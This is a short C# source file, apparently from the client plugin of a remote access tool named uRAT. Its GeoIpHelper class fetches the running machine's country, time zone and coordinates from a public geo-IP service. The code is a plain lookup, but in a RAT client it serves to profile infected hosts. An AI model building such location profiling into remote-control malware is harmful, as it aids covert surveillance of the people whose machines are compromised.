using System.Net;
using System.Xml;

namespace uRAT.CoreClientPlugin.Tools
{
    internal static class GeoIpHelper
    {
        public struct GeoIpInformation
        {
            public string CountryCode;
            public string CountryName;
            public string TimeZone;
            public string Latitude;
            public string Longitude;

            public GeoIpInformation(string countryCode, string countryName, string timeZone, string latitude, string longitude)
            {
                CountryCode = countryCode;
                CountryName = countryName;
                TimeZone = timeZone;
                Latitude = latitude;
                Longitude = longitude;
            }
        }

        public static GeoIpInformation FetchInformation()
        {
            using (var wc = new WebClient())
            {
                var xmlDoc = new XmlDocument();
                xmlDoc.LoadXml(wc.DownloadString("https://freegeoip.net/xml/"));
                var rootElement = xmlDoc["Response"];
                var info = new GeoIpInformation();

                info.CountryCode = rootElement["CountryCode"].InnerText;
                info.CountryName = rootElement["CountryName"].InnerText;
                info.TimeZone = rootElement["TimeZone"].InnerText;
                info.Latitude = rootElement["Latitude"].InnerText;
                info.Longitude = rootElement["Longitude"].InnerText;

                return info;
            }
        }
    }
}
